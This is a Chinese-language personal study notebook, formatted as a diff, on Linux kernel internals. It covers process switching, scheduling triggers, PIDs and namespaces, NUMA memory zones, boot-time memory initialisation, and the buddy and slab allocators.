+		switch_to
+			最后用switch_to完成了进程的切换, 该函数切换了寄存器状态和栈, 
+			执行环境的切换是在switch_to()中完成的, switch_to完成最终的进程切换，
+			它保存原进程的所有寄存器信息，恢复新进程的所有寄存器信息，并执行新的进程
+			即switch_to之前还是 prev进程,switch_to执行了后,便转到了next进程的switch_to后的内容
+			就是prev会停在prev的switch_to函数里,next却从next的switch_函数返回出来了!!(真正完成了进程切换)
+			即开始执行 next进程switch_to之后的代码
+			而prev进程switch_to之后的代码只有在当前进程下一次被选择运行时才会执行
+			在每个switch_to被调用的时候, prev和next指针位于各个进程的内核栈中, 
+				prev指向了当前运行的进程, 而next指向了将要运行的下一个进程
+			switch_to执行了以下操作:
+				进程切换, 即esp的切换, 由于从esp可以找到进程的描述符
+				硬件上下文切换, 设置ip寄存器的值, 并jmp到__switch_to函数
+				堆栈的切换, 即ebp的切换, ebp是栈底指针, 它确定了当前用户空间属于哪个进程
+			switch_to(prev, next, last) 有三个参数意义
+				譬如有a,b,c,d 4个进程,有如下切换 a->b, b->d, d->b, b->c, c->d, d->a
+				第一次切换 switch_to(a,b,last) 执行switch_to的时候是a进程,要切到b进程去,
+				当真的切到b后,其实a进程停在了他自己的switch_to函数,就说这个 switch_to(a,b,last) 停住了
+				但最后一次切换 switch_to(d,a,last)后,a进程从停在的他自己的switch_to函数动起来了,
+				就说这个 switch_to(a,b,last) 又动起来了,然后这last记录了是由那个进程切回到a进程来,这里last=d
+				系统为了告知调度器, a再次执行前的进程是d, 通过switch_to的last参数返回的prev指向d
+				即prev也从a换成了d,即 prev=last=d,
+		barrier路障同步
+			从switch_to返回后,其实就已经活动在新的进程了,后面的这些函数都是新进程内核态里执行的,
+			也可以这么想进程在switch_to停住的时候其实是被切换了,现在又从switch_to动起来并跳出,说明已经切换回来可以继续动!!!!
+			重新动起来的第一件事是barrier()
+			其实这个barrier()应该不需要的,但在编译器编译的时候起作用的,
+			如果没有barrier()
+			switch_to()后面就是finish_task_switch()了,
+			但编译的时候,编译器的优化有可能把switch_to()和finish_task_switch()的执行步骤糅合一块
+			因为编译器不能分辨这时进程切换的关键地方,反而他优化分析到,他们是个连续过程,以下的做法运行更快,执行文件更小
+			先执行switch_to()几条命令后,又优先插入finish_task_switch()几条命令,然后再继续执行switch_to()几条命令
+			这时万万不允许的,所以,编译的时候,一定要避免两者因为编译优化而指令穿插!!!!
+			所以中间由 barrier 隔开
+		finish_task_switch(prev)完成清理工作
+			重新动起来的第二件事是finish_task_switch()
+			处理转回来时,之前的被停住的进程的相关信息!!!
+			比如说上述的  a->b, b->d, d->b, b->c, c->d, d->a
+			最后转回到a时, 即switch_to(d,a,last)停住,switch_to(a,b,last)返回时,
+			switch_to(a,b,last)的prev参数从本来指向a自己,变成了指向了d
+			finish_task_switch(prev)是处理进程 d 的状态 信息, 
+			比如说,a发现d进程已经处于TASK_DEAD状态,就释放d进程的TASK_STRUCT结构,即真正地删除了标识已结束的d进程!!!!
+虽然上下文切换是两个进程间的切换核心,但是如何唤起进程切换是一个大问题!!
+	意味如果唤起进程切换 的是在 内核进程中运行, 那又是如何唤起进程切换先进入这个所谓的内核进程呢?是一个死结问题
+	若是kernel的中断程序唤起进程切换,那这个中断程序是属于哪个进程呢?
+	如果中断不属于任何进程,那又是如何做到让现在进程停下手上工作,突然间开始切换到新进程的内核态代码区?
+进程调度切换只有一个方法: schedule()->context_switch()
+	schedule()->context_switch()在切换动作前运行在 prev进程,
+	在切换动作后,schedule()->context_switch()的收尾指令运行在 next进程
+主调度器(核心调度器):
+	指进程主动调用schedule()
+	schedule()是在当前执行中德尔进程执行的,直至切换到别的进程.并不是在某个特定的内核进程的执行两个进程的调度
+	context_switch()是schedule()的核心内容
+周期调度器(通用调度器):周期性机制,
+	定时中断,中断时,cpu从user_mode 进入irq_mode ,执行定时中断函数
+	(其实就是本来cpu运行在user_mode的寄存器组,中断后,转到irq_mode寄存器组上工作,user_mode的寄存器组被冻结在当前状态)
+	定时中断函数先 保存当前cpu在user_mode下执行的进程(例如进程A)的进度以及上下文,即被冻结的user_mode的寄存器组相关内容会被包存起来
+		然后给进程A插入一段ret_from_sys_call（）内容,即改写user_mode的寄存器组内容,
+		使得中断函数结束返回后,cpu回到user_mode,进程A不会继续之前的内容,而是先执行ret_from_sys_call（）后再执行之前的内容
+	注意:
+		我们之前一直谈论的 用户进程 ,内核进程 指的是 cpu工作在user_mode的寄存器组时 做进程的划分,
+		当cpu工作在irq_mode的寄存器组时,这时执行的只是中断函数,并没有什么进程划分,并不属于上面的用户进程,内核进程任一方,
+		即 scheduler_tick() 是在中断函数中执行的, 不是在某个 内核进程 或者 用户进程里执行
+	scheduler_tick() 会分析当前cpu从user_mode下执行的进程(例如进程A)是不是要进行调度了!!!
+		如果是,则在进程A的数据结构上标记相关内容 这叫激发延迟调度
+	中断函数结束返回后,cpu回到user_mode执行进程A,进程A不会继续之前的内容,会先执行ret_from_sys_call（）
+		ret_from_sys_call（）如果检测相关标记,就会执行 schedule()->context_switch() 切换掉进程A,
+		假若进程A真被切换掉了,进程A会停在ret_from_sys_call（）->schedule()->context_switch()
+		后面,进程A被切换回来重新运行,会先从ret_from_sys_call（）返回,然后回到之前被定时中断函数打断的地方执行!!!
+	调用关系:
+	static irqreturn_t ioc_timer_interrupt(int irq, void *dev_id)		(arch/arm/mach-rpc) 所以timer_tick应该没有用到
+	    ->void timer_tick(void)			(arch/arm/kernel)
+	        ->update_process_times(int user_tick)	
+	            ->scheduler_tick();
+	void tick_set_periodic_handler(struct clock_event_device *dev, int broadcast)
+	    ->void tick_handle_periodic(struct clock_event_device *dev)
+	        ->static void tick_periodic(int cpu)	(kernel/time)
+	            ->update_process_times(int user_tick)	
+	                ->scheduler_tick();
+	void tick_setup_sched_timer(void)
+	    ->static enum hrtimer_restart tick_sched_timer(struct hrtimer *timer)
+	        ->static void tick_sched_handle(struct tick_sched *ts, struct pt_regs *regs)	(kernel/time)
+	            ->update_process_times(int user_tick)	
+	                ->scheduler_tick();
+	int tick_check_oneshot_change(int allow_nohz)
+	    static void tick_nohz_switch_to_nohz(void)
+	        static void tick_nohz_handler(struct clock_event_device *dev)
+	            ->static void tick_sched_handle(struct tick_sched *ts, struct pt_regs *regs)	(kernel/time)
+	                ->update_process_times(int user_tick)	
+	                    ->scheduler_tick();
+
+未整理的网络参考: https://zhidao.baidu.com/question/756077885634341164.html
+Linux在众多进程中是怎么进行调度的，这个牵涉到Linux进程调度时机的概念，由Linux内核中Schedule（）的函数来决定是否要进行进程的切换，
+如果要切换的话，切换到哪个进程等等。
+Linux进程调度时机主要有：
+1、进程状态转换的时刻：进程终止、进程睡眠；
+2、当前进程的时间片用完时（current->counter=0）；
+3、设备驱动程序
+4、进程从中断、异常及系统调用返回到用户态时；
+时机1，进程要调用sleep（）或exit（）等函数进行状态转换，这些函数会主动调用调度程序进行进程调度；
+时机2，由于进程的时间片是由时钟中断来更新的，因此，这种情况和时机4是一样的。
+时机3，当设备驱动程序执行长而重复的任务时，直接调用调度程序。在每次反复循环中，驱动程序都检查need_resched的值，
+	如果必要，则调用调度程序schedule()主动放弃CPU。
+时机4，如前所述，不管是从中断、异常还是系统调用返回，最终都调用ret_from_sys_call（），由这个函数进行调度标志的检测，
+	如果必要，则调用调用调度程序。那么，为什么从系统调用返回时要调用调度程序呢？这当然是从效率考虑。
+	从系统调用返回意味着要离开内核态而返回到用户态，而状态的转换要花费一定的时间，因此，在返回到用户态前，系统把在内核态该处理的事全部做完。
+对于直接执行调度程序的时机，我们不讨论，因为后面我们将会描述调度程序的工作过程。前面我们讨论了时钟中断，知道了时钟中断的重要作用，
+	下面我们就简单看一下每个时钟中断发生时内核要做的工作，首先对这个最频繁的调度时机有一个大体了解，然后再详细讨论调度程序的具体工作过程。
+每个时钟中断（timer interrupt）发生时，由三个函数协同工作，共同完成进程的选择和切换，
+	它们是：schedule（）、do_timer（）及ret_form_sys_call（）。我们先来解释一下这三个函数：
+schedule（）：进程调度函数，由它来完成进程的选择（调度）；
+do_timer（）：暂且称之为时钟函数，该函数在时钟中断服务程序中被调用，是时钟中断服务程序的主要组成部分，
+	该函数被调用的频率就是时钟中断的频率即每秒钟100次（简称100赫兹或100Hz）；
+ret_from_sys_call（）：系统调用返回函数。当一个系统调用或中断完成时，该函数被调用，用于处理一些收尾工作，例如信号处理、核心任务等等。
+这三个函数是如何协调工作的呢？
+前面我们看到，时钟中断是一个中断服务程序，它的主要组成部分就是时钟函数do_timer（），
+	由这个函数完成系统时间的更新、进程时间片的更新等工作，更新后的进程时间片counter作为调度的主要依据。
+在时钟中断返回时，要调用函数ret_from_sys_call（），前面我们已经讨论过这个函数，在这个函数中有如下几行：
+cmpl $0, _need_resched
+jne reschedule
+……
+restore_all:
+RESTORE_ALL
+
+reschedule:
+call SYMBOL_NAME(schedule)
+jmp ret_from_sys_call
+
+这几行的意思很明显：检测 need_resched 标志，如果此标志为非0，那么就转到reschedule处调用调度程序schedule（）进行进程的选择。
+	调度程序schedule（）会根据具体的标准在运行队列中选择下一个应该运行的进程。当从调度程序返回时，如果发现又有调度标志被设置，
+	则又调用调度程序，直到调度标志为0，这时，从调度程序返回时由RESTORE_ALL恢复被选定进程的环境，返回到被选定进程的用户空间，使之得到运行。
+以上就是时钟中断这个最频繁的调度时机。讨论这个的主要目的使读者对时机4有个大致的了解。
+另外，TIF_NEED_RESCHED的设置时机 :
+设置这个标志的函数主要有两个: resched_task(),set_tsk_need_resched().主要是resched_task,
+	而resched_task的调用者 check_preempt_curr更是通过:try_to_wake_up/wake_up_new_task/pull_task /__migrate_task 
+	这些被广泛使用的函数, 从而分布在内核中大量的检查点有机会抢占进程.
+最后要说明的是，系统调用返回函数ret_from_sys_call（）是从系统调用、异常及中断返回函数通常要调用的函数，
+	但并不是非得调用，对于那些要经常被响应的和要被尽快处理的中断请求信号，为了减少系统开销，
+	处理完成后并不调用 ret_from_sys_call（）（因为很显然的，从这些中断处理程序返回到的用户空间肯定是那个被中断的进程，无需重新选择），
+	并且，它们作的工作要尽可能少，因为响应的频率太高了。
+Linux进程调度和其他的UNIX进程调度不同，尤其是在“nice level”优先级的处理上，与优先权调度（priority高的进程最先运行）不同，
+	Linux用的是时间片轮转调度（Round Robing），但同时又保证了高优先级的进程运行的既快、时间又长（both sooner and longer）。
+	而标准的UNIX调度程序都用到了多级进程队列。大多数的实现都用到了二级优先队列：一个标准队列和一个实时（“real time”）队列。
+	一般情况下，如果实时队列中的进程未被阻塞，它们都要在标准队列中的进程之前被执行，并且，每个队列中，“nice level”高的进程先被执行。
+总体上，Linux 调度序程在交互性方面表现很出色，当然了，这是以牺牲一部分“吞吐量”为代价的。 
+
+扩展内容 cache:
+机子启动时会先把所有cache关闭,因为这时的cache存蓄随机数据,如果不关,根据cache的工作原理分析,机子运作可能会失败
+在一个处理器系统中，指令Cache与数据Cache的组成方式和使用规则有所不同。
+在现代处理器系统中，在L1 Cache层面，指令Cache与数据Cache通常分离，
+而在其后的Cache层次中，指令与数据混合存放，在多数情况下L1指令Cache是只读的，
+因此Cache Block中包含的状态较少一些，一致性处理相对较为简单
+
+
+
+
+
+
+
+
+
+20170808
+进程深入学习:
+	esp寄存器是CPU栈指针
+	namespace 是只使用一个内核在一台物理计算机上运作，前述的所有全局资源都通过命名空间抽象起来。
+		  这使得可以将一组进程放置到容器中，各个容器彼此隔离。
+		  本质上，命名空间建立了系统的不同视图。此前的每一项全局资源都必须包装到容器数据结构中，
+		  只有资源和包含资源的命名空间构成的二元组仍然是全局唯一的。虽然在给定容器内部资源是自足的，但无法提供在容器外部具有唯一性的ID
+		  这意义相当于 让同一台电脑,同时间运行多个个各自独立的linux系统,互相隔离,互不影响
+		  一个进程有多个pid 分别属于多个namespace
+	 各种相关id:
+	 	PID 内核唯一区分每个进程的标识
+			pid是 Linux 中在其命名空间中唯一标识进程而分配给它的一个号码，称做进程ID号，简称PID。
+			在使用 fork 或 clone 系统调用时产生的进程均会由内核分配一个新的唯一的PID值
+			这个pid用于内核唯一的区分每个进程
+			注意它并不是我们用户空间通过getpid( )所获取到的那个进程号，至于原因么，接着往下看
+		TGID 线程组（轻量级进程组）的ID标识
+			在一个进程中，如果以CLONE_THREAD标志来调用clone建立的进程就是该进程的一个线程
+			（即轻量级进程，Linux其实没有严格的进程概念），它们处于一个线程组，
+			该线程组的所有线程的ID叫做TGID。处于相同的线程组中的所有进程都有相同的TGID，
+			但是由于他们是不同的进程，因此其pid各不相同；线程组组长（也叫主线程）的TGID与其PID相同；
+			一个进程没有使用线程，则其TGID与PID也相同。
+			该进程的线程描述符。在linux内核中对线程并没有做特殊的处理，还是由task_struct来管理。
+			所以从内核的角度看， 用户态的线程本质上还是一个进程。
+			对于同一个进程（用户态角度）中不同的线程其tgid是相同的，但是pid各不相同。 
+			主线程即group_leader（主线程会创建其他所有的子线程）。如果是单线程进程（用户态角度），它的pid等于tgid。
+		PGID
+			另外，独立的进程可以组成进程组（使用setpgrp系统调用），进程组可以简化向所有组内进程发送信号的操作
+			例如用管道连接的进程处在同一进程组内。进程组ID叫做PGID，进程组内的所有进程都有相同的PGID，等于该组组长的PID。
+		SID
+			几个进程组可以合并成一个会话组（使用setsid系统调用），可以用于终端程序设计。
+			会话组中所有进程都有相同的SID,保存在task_struct的session成员中
+		全局ID 在内核本身和初始命名空间中唯一的ID，在系统启动期间开始的 init 进程即属于该初始命名空间。
+			系统中每个进程都对应了该命名空间的一个PID，叫全局ID，保证在整个系统中唯一。
+			全局PID和TGID直接保存在task_struct中，分别是task_struct的pid和tgid成员：
+		局部ID 对于属于某个特定的命名空间，它在其命名空间内分配的ID为局部ID，该ID也可以出现在其他的命名空间中。
+		struct task_struct -> nsproxy 	指针指向namespace相关的域，通过nsproxy域可以知道该task_struct属于哪个pid_namespace
+	#如何快速地根据局部ID、命名空间、ID类型找到对应进程的 task_struct
+		pid_hash[]
+		这是一个hash表的结构，根据pid的nr值哈希到其某个表项，若有多个 pid 结构对应到同一个表项，这里解决冲突使用的是散列表法。
+		这样，就能解决开始提出的第2个问题了，根据PID值怎样快速地找到task_struct结构体：
+		首先通过 PID 计算 pid 挂接到哈希表 pid_hash[] 的表项
+		遍历该表项，找到 pid 结构体中 nr 值与 PID 值相同的那个 pid
+		再通过该 pid 结构体的 tasks 指针找到 node
+		最后根据内核的 container_of 机制就能找到 task_struct 结构体
+	#如何快速地给新进程在可见的命名空间内分配一个唯一的 PID
+		pid_map
+		这是一个位图，用来唯一分配PID值的结构，图中灰色表示已经分配过的值，在新建一个进程时，
+		只需在其中找到一个为分配过的值赋给 pid 结构体的 nr，再将pid_map 中该值设为已分配标志。
+		这也就解决了上面的第3个问题——如何快速地分配一个全局的PID
+		至于上面的**第1个问题*就更加简单，已知 task_struct 结构体，根据其 pid_link 的 pid 指针找到 pid 结构体，取出其 nr 即为 PID 号。
+	linux线程与进程区别!!!
+		我们在区分Linux进程类别, 但是我还是想说Linux下只有一种类型的进程，那就是task_struct，
+		当然我也想说linux其实也没有线程的概念, 只是将那些与其他进程共享资源的进程称之为线程
+		Linux下线程其实上是与其他进程共享某些资源的进程而已。但是我们习惯上还是称他们为线程或者轻量级进程
+		Linux上进程分3种，内核线程（或者叫核心进程）、用户进程、用户线程, 当然如果更严谨的，你也可以认为用户进程和用户线程都是用户进程
+		这里的线程不是我们印象中多cpu并行执行的线程
+	Linux下有3个特殊的进程，idle进程($PID = 0$), init进程($PID = 1$)和kthreadd($PID = 2$)
+		idle进程由系统自动创建, 运行在内核态 idle进程其pid=0，其前身是系统创建的第一个进程，
+			也是唯一一个没有通过fork或者kernel_thread产生的进程
+		0号进程创建1号进程的方式如下 :kernel_thread(kernel_init, NULL, CLONE_FS);
+			随后，1号进程调用do_execve运行可执行程序init，并演变成用户态1号进程，即init进程。	
+		1号进程的执行函数就是kernel_init, 这个函数被定义init/main.c中
+		由0号进程创建1号进程（内核态），1号内核线程负责执行内核的部分初始化工作及进行系统配置，
+			并创建若干个用于高速缓存和虚拟主存管理的内核线程。
+		kthreadd: 是其他内核线程的建造者. 
+			内核线程其实就是上述区分说明的内核进程,由于共用资源的关系,所以属于linux线程的定义,所以也叫内核线程
+			ps -eo pid,ppid,command		//查看当前存在的进程
+			以下显示 其中一部分 的内核内核线程
+			  PID  PPID COMMAND
+			    1     0 /sbin/init
+			    2     0 [kthreadd]
+			    3     2 [ksoftirqd/0]
+			    5     2 [kworker/0:0H]
+			    7     2 [rcu_sched]
+			    8     2 [rcu_bh]
+			    9     2 [rcuos/0]
+			   10     2 [rcuob/0]
+			   11     2 [migration/0]
+			   12     2 [watchdog/0]
+			   13     2 [watchdog/1]
+			   14     2 [migration/1]
+			   15     2 [ksoftirqd/1]
+			   17     2 [kworker/1:0H]
+			   18     2 [rcuos/1]
+			   19     2 [rcuob/1]
+			   20     2 [watchdog/2]
+			   21     2 [migration/2]
+			   22     2 [ksoftirqd/2]
+			   24     2 [kworker/2:0H]
+			   25     2 [rcuos/2]
+			   26     2 [rcuob/2]
+			   27     2 [watchdog/3]
+			   28     2 [migration/3]
+			   29     2 [ksoftirqd/3]	
+	系统调用:
+		实现与C库不同, 普通C函数通过将参数的值压入到进程的栈中进行参数的传递。
+		由于系统调用是通过中断进程从用户态到内核态的一种特殊的函数调用，
+		没有用户态或者内核态的堆栈可以被用来在调用函数和被调函数之间进行参数传递。
+		系统调用通过CPU的寄存器来进行参数传递。在进行系统调用之前，系统调用的参数被写入CPU的寄存器，
+		而在实际调用系统服务例程之前，内核将CPU寄存器的内容拷贝到内核堆栈中，实现参数的传递。
+		即不同的体系结构可能需要采用不同的方式或者寄存器来存储函数调用的参数， 
+		因此linux在设计系统调用的时候, 将其划分成体系结构相关的层次和体系结构无关的层次, 
+		前者复杂提取出依赖与体系结构的特定的参数， 后者则依据参数的设置执行特定的真正操作
+	thread_info结构:
+		除了thread信息外,还紧贴着一个内核栈,一般加起来共8k空间
+	do_fork:
+		只是复制出一个新的进程
+	do_execve:
+		替换进程里的程序内容,使进程执行被设计的程序内容!!
+	ELF:
+		代表Executable and Linkable Format。他是一种可执行文件、目标文件和库使用的文件格式。
+memory深入学习:(内核内存分配管理)
+	服务器系统架构来看，目前的商用服务器大体可以分为三类
+		对称多处理器结构(SMP：Symmetric Multi-Processor):
+			多cpu 共享统一硬盘,内存,各类I/O
+		非一致存储访问结构(NUMA：Non-Uniform Memory Access):
+			安排每个cpu都有自己的硬盘,内存,各类I/O,访问速度快,每个cpu也可以直接访问其他cpu的资源,但是访问速度慢
+		海量并行处理结构(MPP：Massive Parallel Processing):
+			多个SMP并联,每个smp之间通讯通过特定协议!!
+	共享存储型多处理机有两种模型
+		均匀存储器存取（Uniform-Memory-Access，简称UMA）模型:
+			传统的多核运算是使用SMP(Symmetric Multi-Processor )模式：将多个处理器与一个集中的存储器和I/O总线相连。
+			所有处理器只能访问同一个物理存储器，因此SMP系统有时也被称为一致存储器访问（UMA）结构体系，
+			一致性意指无论在什么时候，处理器只能为内存的每个数据保持或共享唯一一个数值
+		非均匀存储器存取（Nonuniform-Memory-Access，简称NUMA）模型
+			NUMA模式是一种分布式存储器访问方式，处理器可以同时访问不同的存储器地址，大幅度提高并行性。 
+			NUMA总是多处理器计算机,系统的哪个CPU都有本地内存, 可支持快速的访问, 各个处理器之前通过总线链接起来, 
+			以支持堆其他CPU的本地内存的访问, 当然访问要比本地内存慢.
+	linux 的内存机构,使用的是 NUMA
+		处理器被划分成多个"节点"(node), 每个节点被分配有的本地存储器空间. 所有节点中的处理器都可以访问全部的系统物理存储器，
+		但是访问本节点内的存储器所需要的时间，比访问某些远程节点内的存储器所花的时间要少得多
+		按道理,每个 node 对应 一个cpu!!
+		内存被分割成多个区域（BANK，也叫"簇"），依据簇与处理器的"距离"不同, 访问不同簇的代码也会不同. 
+		比如，可能把内存的一个簇指派给每个处理器，或则某个簇和设备卡很近，很适合DMA，那么就指派给该设备。
+		因此当前的多数系统会把内存系统分割成2块区域，一块是专门给CPU去访问，一块是给外围设备板卡的DMA去访问
+		注意:
+			linux 的内存机构基于 NUMA ,但是兼容 SMP系统架构及对应的UMA, 像以下方式兼容：
+    			SMP多cpu 看做成一个cpu组,
+			在UMA系统中, 内存就相当于一个只使用一个NUMA节点来管理整个系统的内存. 
+			而内存管理的其他地方则认为他们就是在处理一个(伪)NUMA系统.
+		Linux把物理内存划分为三个层次来管理:
+			存储节点(Node): 	
+				CPU被划分为多个节点(node), 内存则被分簇, 每个CPU对应一个本地物理内存, 
+				即一个CPU-node对应一个内存簇bank，即每个内存簇被认为是一个节点
+				用pd_data_t描述内存节点node
+			管理区(Zone):
+				每个物理内存节点node被划分为多个内存管理区域, 用于表示不同范围的内存, 内核可以使用不同的映射方式映射物理内存
+				一个管理区(zone)由struct zone结构体来描述
+			页面(Page):
+				内存被细分为多个页面帧, 页面是最基本的页面分配的单位
+	管理区(Zone):
+		zone:讨论的是 内核虚拟地址空间分配,不包括用户空间的分配与使内容
+		对于典型x86机器，管理区(内存区域)类型如下分布
+			类型 		区域
+			ZONE_DMA 	0~15MB
+			ZONE_NORMAL 	16MB~895MB
+			ZONE_HIGHMEM 	896MB~物理内存结束
+			而由于32位系统中, Linux内核虚拟地址空间只有 1G, 而0~895M这个986MB被用于DMA和直接映射, 
+			剩余的物理内存被成为高端内存. 那内核是如何借助剩余128MB高端内存地址空间是如何实现访问可以所有物理内存？
+		高端内存:
+			当内核想访问高于896MB物理地址内存时，从0xF8000000 ~ 0xFFFFFFFF地址空间范围内找一段相应大小空闲的逻辑地址空间，
+			借用一会。借用这段逻辑地址空间，建立映射到想访问的那段物理内存（即填充内核PTE页面表），
+			临时用一会，用完后归还。这样别人也可以借用这段地址空间访问其他物理内存，实现了使用有限的地址空间，访问所有所有物理内存
+	start_kernel启动过程:
+		在初始化过程中, 还必须建立内存管理的数据结构, 以及很多事务. 因为内核在内存管理完全初始化之前就需要使用内存.
+		start_kernel()
+		    |---->page_address_init()
+		    |     考虑支持高端内存
+		    |     业务：初始化page_address_pool链表；
+		    |          将page_address_maps数组元素按索引降序插入
+		    |          page_address_pool链表; 
+		    |          初始化page_address_htable数组.
+		    | 
+		    |---->setup_arch(&command_line);
+		    |     初始化特定体系结构的内容
+		    	  |
+		    	  |---->arm64_memblock_init( );
+		          |     初始化引导阶段的内存分配器memblock
+			  |     (memblock已经通过arm64_memblock_init完成了初始化, 至此系统中的内存可以通过memblock分配了)
+		          |
+		          |---->paging_init();
+		          |     分页机制初始化
+			  |     (paging_init完成了分页机制的初始化, 至此内核已经布局了一套完整的虚拟内存空间)
+		          |
+		          |---->bootmem_init();   [当前位置]
+		          |     始化内存数据结构包括内存节点, 内存域和页帧page
+		                |
+		                |---->arm64_numa_init();
+		                |     支持numa架构
+		                |
+		                |---->zone_sizes_init(min, max);
+		                    来初始化节点和管理区的一些数据项
+		                    |
+		                    |---->free_area_init_node
+		                    |   初始化内存节点
+		                    |
+		                        |---->free_area_init_core
+		                            |	初始化zone
+		                            |
+		                            |---->memmap_init
+		                            |	初始化page页面
+		                |
+		                |---->memblock_dump_all();
+		                |   初始化完成, 显示memblock的保留的所有内存信息
+		         	   |
+		    |---->build_all_zonelists()	初始化每个内存节点的zonelists
+		    |     为系统中的zone建立后备zone的列表.
+		    |     所有zone的后备列表都在
+		    |     pglist_data->node_zonelists[0]中;
+		    |
+		    |     期间也对per-CPU变量boot_pageset做了初始化. 
+	 	    |
+		    |
+		    |---->page_alloc_init()
+		         |---->hotcpu_notifier(page_alloc_cpu_notifier, 0);
+		         |     不考虑热插拔CPU 
+		         |
+		    |---->pidhash_init()
+		    |     详见下文.
+		    |     根据低端内存页数和散列度，分配hash空间，并赋予pid_hash
+		    |
+		    |---->vfs_caches_init_early()
+		          |---->dcache_init_early()
+		          |     dentry_hashtable空间，d_hash_shift, h_hash_mask赋值；
+		          |     同pidhash_init();
+		          |     区别:
+		          |         散列度变化了（13 - PAGE_SHIFT）;
+		          |         传入alloc_large_system_hash的最后参数值为0;
+		          |
+		          |---->inode_init_early()
+		          |     inode_hashtable空间，i_hash_shift, i_hash_mask赋值；
+		          |     同pidhash_init();
+		          |     区别:
+		          |         散列度变化了（14 - PAGE_SHIFT）;
+		          |         传入alloc_large_system_hash的最后参数值为0;
+		          |
+		在系统启动过程期间, 使用了额外的简化悉尼股市的内存管理模块, 然后在初始化完成后, 将旧的模块丢弃掉.
+		setup_arch 	        是一个特定于体系结构的设置函数, 其中一项任务是负责初始化自举分配器
+		mm_init_cpumask 	初始化CPU屏蔽字
+		setup_per_cpu_areas 	函数(查看定义)给每个CPU分配内存，并拷贝.data.percpu段的数据. 为系统中的每个CPU的per_cpu变量申请空间.
+					在SMP系统中, setup_per_cpu_areas初始化源代码中(使用per_cpu宏)定义的静态per-cpu变量, 
+					这种变量对系统中每个CPU都有一个独立的副本.此类变量保存在内核二进制影像的一个独立的段中,
+					setup_per_cpu_areas的目的就是为系统中各个CPU分别创建一份这些数据的副本在非SMP系统中这是一个空操作
+		build_all_zonelists 	建立并初始化结点和内存域的数据结构
+		mm_init 		建立了内核的内存分配器,
+					其中通过mem_init停用bootmem分配器并迁移到实际的内存管理器(比如伙伴系统)
+					然后调用kmem_cache_init函数初始化内核内部用于小块内存区的分配器
+		kmem_cache_init_late 	在kmem_cache_init之后, 完善分配器的缓存机制,　
+					当前3个可用的内核内存分配器slab, slob, slub都会定义此函数　
+		kmemleak_init 		Kmemleak工作于内核态，Kmemleak 提供了一种可选的内核泄漏检测，
+					其方法类似于跟踪内存收集器。当独立的对象没有被释放时，
+					其报告记录在 /sys/kernel/debug/kmemleak中, Kmemcheck能够帮助定位大多数内存错误的上下文
+		setup_per_cpu_pageset 	初始化CPU高速缓存行, 为pagesets的第一个数组元素分配内存, 换句话说, 其实就是第一个系统处理器分配
+					由于在分页情况下，每次存储器访问都要存取多级页表，这就大大降低了访问速度。
+					所以，为了提高速度，在CPU中设置一个最近存取页面的高速缓存硬件机制，当进行存储器访问时，
+					先检查要访问的页面是否在高速缓存中.
+	内存分配:
+		linux内核的内存管理分三个阶段。
+			第一阶段 | 系统启动 | bootmem或者memblock初始化完成 
+				(此阶段只能使用memblock_reserve函数分配内存， 早期内核中使用init_bootmem_done = 1标识此阶段结束)
+				(bootmen内核刚启动时执行的内存管理!!)
+			第二阶段 | bootmem或者memblock初始化完 | buddy完成前 | 引导内存分配器bootmem或者memblock接受内存的管理工作, 
+				早期内核中使用mem_init_done = 1标记此阶段的结束 
+			第三阶段 | buddy初始化完成 | 系统停止运行 | 可以用cache和buddy分配内存	
+		memblock内存分配
+			是将所有的物理内存放到memblock.memory中作为可用内存来管理, 
+			分配过的内存只加入到memblock.reserved中, 并不从memory中移出
+			同理释放内存也会加入到memory中. 也就是说, memory在fill过后基本就是不动的了. 
+			申请和分配内存仅仅修改reserved就达到目的. 在初始化阶段没有那么多复杂的内存操作场景, 
+			甚至很多地方都是申请了内存做永久使用的, 所以这样的内存管理方式已经足够凑合着用了, 
+			毕竟内核也不指望用它一辈子. 在系统完成初始化之后所有的工作会移交给强大的buddy系统来进行内存管理
+	伙伴系统:
+		分出一个含2的n次方个页的块,然后这个块分成连部分,一个使用,一个空闲.这两个块是伙伴(n根据实际情况定)
+		如果使用的块提供的内存不够,空闲的块再次分成两块,一个使用,一个空闲.这两个块又是另一伙伴
+		如此类推.
+		内核初始化时使用的是memblock内存分配,初始化后,就把所有内存管理的任务交给了伙伴系统
+		当那一个使用的块占用完毕,会跟自己的空闲块伙伴重新变成上一级的空闲块
+		有关伙伴系统和当前状态的信息可以在/proc/buddyinfo中获取
+		kmalloc: 一般是分配 内核的空间的zone_nomal虚拟空间,直接映射到 物理内存的 从3g+16mb到3g+895mb 的内存
+		vmalloc:一般分配 zone_highmen的前120mb虚拟空间 可映射每一个物理内存位置
+		kmap:一般是分配 zone_highmen的中间4mb虚拟空间 可以映射每一个物理内存位置
+		kmap_automic:kmap的高效版,一般是分配 zone_highmen的最后4mb虚拟空间 可以映射每一个物理内存位置
+	slab分配器:
+		也叫slab着色器,其实就是一个个的结构数据预备队列,用的时候使用已分配好内存的空闲的结构数据,用完后返还回空闲结构数据
+		通常用于 常用的结构数据 例如 struct task 什么的
+		
+		这种方式,比起 每次使用新结构数据时 都要重新通过伙伴系统分配内存,不用则释放内存的做法要高效
+		slab分配器初始化:
+			start_kernel() -> mm_init() -> kmem_cache_init();
+			第一个阶段 	是根据kmem_cache来设置cache_cache的字段值
+			第二个阶段 	首先是创建arraycache_init对应的高速缓存，同时也是在这个kmem_cache_create的调用过程中，
+					创建了用于保存cache的kmem_cache的slab，并初始化了slab中的各个对象
+			第三个阶段 	创建kmem_list3对应的高速缓存，在这里要注意的一点是，
+					如果sizeof(arraycache_t)和sizeof(kmem_list3)的大小一样大，
+					那么就不再使用kmem_cache_create来为kmem_list3创建cache了，
+					因为如果两者相等的话，两者就可以使用同一个cache
+			第四个阶段 	创建并初始化所有的通用cache和dma cache
+			第五个阶段 	创建两个arraycache_init对象，
+					分别取代cache_cache中的array字段 和 malloc_sizes[INDEX_AC].cs_cachep->array字段
+			第六个阶段 	创建两个kmem_list3对象，取代cache_cache中的kmem_list3字段
+					和malloc_sizes[INDEX_AC].cs_cachep->nodelist3字段.
+					如此一来，经过上面的六个阶段后，所有的初始化工作基本完成了
+		slab使用:
+			例如系统频繁申请使用 A结构的数据,所以建立一个A结构数据的预备队
+			kmem_cache_create() 创建一个 A结构数据预备队! 从伙伴系统里分出内存组建预备队
+			struct kmem_cache 是一个预备队的描述符结构,即一个 struct kmem_cache代表 一个结构数据的预备队
+			一个预备队只服务于同一个数据结构
+			一个 A结构数据预备队:
+				有多个slab组,一个slab组是连续的多个页构成
